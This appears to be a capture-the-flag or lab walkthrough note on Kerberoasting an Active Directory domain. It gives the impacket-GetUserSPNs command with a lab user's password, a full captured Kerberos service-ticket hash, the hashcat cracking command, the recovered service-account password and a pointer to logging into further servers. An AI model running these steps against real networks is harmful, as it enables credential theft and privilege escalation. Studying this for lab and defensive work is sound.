
A Kerberoasting attack is an attack that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name, or SPN. 

This attack requires an authenticated domain user to request a Kerberos service ticket from a Ticket Granting Service (TGS). 

That ticket is encrypted with the hash of the service account, which you can try to brute force using hashcat, after capturing the TGS ticket.

The main advantage of this attack is that you do not require a privileged user to require a TGS, since any Domain user account can be used to request service tickets from the TGS.

Once the password hash is obtained, the attacker can then attempt to crack it using offline password-cracking techniques, such as dictionary attacks or brute force attacks. If successful, the attacker gains access to the service account’s credentials, which can be used to further escalate privileges within the network.

[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) can be used to obtain a password hash for user accounts that have an SPN (service principal name). If an SPN is set on a user account it is possible to request a Service Ticket for this account and attempt to crack it in order to retrieve the user password. This attack is named [Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This script can also be used for [Kerberoast without authentication](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication).

## Kerberoast

1. Use a tool called [Impacket-GetUserSPNs](https://www.kali.org/tools/impacket-scripts/) to grab Kerberos hashes for the users.
    
2. On the attacking machine run:
    
	$ `proxychains4 impacket-GetUserSPNs corp.thereserve.loc/laura.wood:'Password1@' -dc-ip 10.200.113.102 -request`

![](https://lh7-us.googleusercontent.com/docsz/AD_4nXdKpODCXEE7HwXezioOnv7OnrWXlGZUBV8cioq6J4udiMyDr2ZJmONN-FcYte7urX2723COfP4NcbHdhfsMKnKqN93RVlnwTU4GSyudqfS444Jkgx9XTssvFC-Y1Ivhwkqql2OTmTHj5URMdgDfyazOX4f8?key=RYwlcatSjtv71wwEi5xjfQ)

You’ll have the usernames and the hash of any of them.

![](https://lh7-us.googleusercontent.com/docsz/AD_4nXfrXzZUMgV-Ru-gXkVhzx3xtqbk86XOpei6Rw21DtHf70dNsiWL8IoqgLJG1hJoR-6Ryb7dGo-Fhcsd_YsmG4dEdPHoQu5mdqNvqmfcWwRg1Ysy4P6jtePpdYDwbPLnvCLOfOoQ5JRdpNHRcNtingnwP3Q?key=RYwlcatSjtv71wwEi5xjfQ)

3. Save every hash in a file.
    
4. Crack the hashes. To avoid more effort you can scan the svcScanning’s hash, saving it in a file called svcScanning.hash.
    

	 `$krb5tgs$23$*svcScanning$CORP.THERESERVE.LOC$corp.thereserve.loc/svcScanning*$cb0af6b80a4a5857704e88994fb21b46$f07312610f701dfe9b317bec0510e6bf26226bff7a0f3058d696388596776f7694d44ab71f9d4f1cd97d2bc34c5107a02a01f4e2605d6edbbe9261b1c7726f752e0cc9e897eaa4fae2157a9ed1a7d01c9ee7c34b4a889789ae640963974b198cea424fc52b49405a3a2e578b96758509370db2abfac01faa4531b9f8624e578e86c5b572426356518c77245604b805329efdad6eb9a27effd78384ec326d5945d2754569074ae520d01509370a843da29c36c4b2d994bbfc3050030bec3da4306d3cdb3c2160412f1d980ab33a616260eef9c0240689712dc8727fdbbdfa0a1a40bdbd8fe78a6c4a520dd665bc23e9e6d47c61295b69833150b336aaeceaaa58d2f97bf1c89ba88e873ce9a33fccf7d92e4c74782e7842833eb7492dca14636e4406f46b3bfa65378325d424791d85e3d83bb2a459bc9e8b1246a0afcea60a95b906519cb71eb1a53d0325058b3a97a858ddc7741a8b751d553c192bc7b34a2f3d5ba6f59a6ca16c4ecae1ee8b5f44cc5138e1ace20e801609827a0b02d773707315345f7f25959c61d1cd9ebb4f94f9308cef20c4b5e106b0c503a006fb8254c6c2776018fc5f3c04738fa5687a02c927c458b1302ad1838514494bb65b8220aed781fb4af2212ae9fa13cae27cfdd43728a7f90299ed1971d840670688f8ac82f65a53bcee2537b280c4293d2d11a0f9be2575dc9d856e990171ce2ae81af18caea1b0c3ca04284d78ce25816b4c181cd8ed15d0afd216cd4675eee152ab1a5a232407d1c5e1d1b8b13623d7f60f7e0a50beed770163da1e5291a33fc694af1577dacfbf3c30e5bdd217c51a99b77ebcaf9b38fe2483cb8aecee5db6e3b9dfcd02194f7b550a877716bf3c0bfd93eccc7f502d7cdc54188e84ddd2dc6d963e31d212eafda729eef3a1bcaa9ed35317980310ae5582e5d52753798635a3675ac14405625ed4c091d7e8c7b4e9c05fbfe0e136d3182b09fd5cf5bb9ac72fa2b7c2d0b97b026e80e331483ea560a55b5dbf00546f16af2fab9dfb859b64b6f5955e5e161b7618f97515542e38b6e41fd5a0a0608027333fd4a56fdf53d42b52901cae0f93bbb67184652da739f934b46859891f24a9e45b43d7f44aeae0a27a7cfeb6e467536f3d507946021d0d7daf77574670ea52da8d589ffd025c9d4f8128570c635032fd058334087105747101ac3373c497c6052429eeea1ee41a3ed502af1177a99a98749c117db71ef9553bd6582a429c589a3d901ef4802b49e2d182fb5c4eb67742513a339fe5df3b03b3abe769fb9f5c40ae107116c58001c3d093d5e8c046a3e320deddafe6653b4b91e600792f5b3798abc0f564827a8910f6127bcb9646d527f8ba875841929eff0985b0e73286b99ac1b856bd8a5f1f3265ed96d7346f2be12a798dda595ccf40a0308c1384417d6db67f69ae9b4ae2031e73d4c6a44849745e451dd95124144e3ba9780df7c6b1ad1bbc376e3365f20a85122234f1cadfb0bd7c43a1aad2da0ff144bcb42aacf13963799e2fe8a229371ac8a158801336aa`

5. Use hashcat to crack it.
    

$ `hashcat -m 13100 -a 0 svcScanning.hash /usr/share/wordlists/rockyou.txt`

![](https://lh7-us.googleusercontent.com/docsz/AD_4nXfP5-2JHuiFmuJ1rwn9hYJRQuYRY8jXprb83YkJ-3EbbMHRsLaxVLcaC5NWvZkcjqIrEOPHe6130zFOK98T-QVZyLzr9gZ1SuFWBrUeB2BjrFSADL4Uvywiv4C2qpixiomcobapnQ-7TJc2_M6caGpGMRfg?key=RYwlcatSjtv71wwEi5xjfQ)

The password is: **Pasword1!**

> With this account, we can now login into SERVER1 and SERVER2.

**Next step:** [[Enumerate 10.200.X.31 and 32]]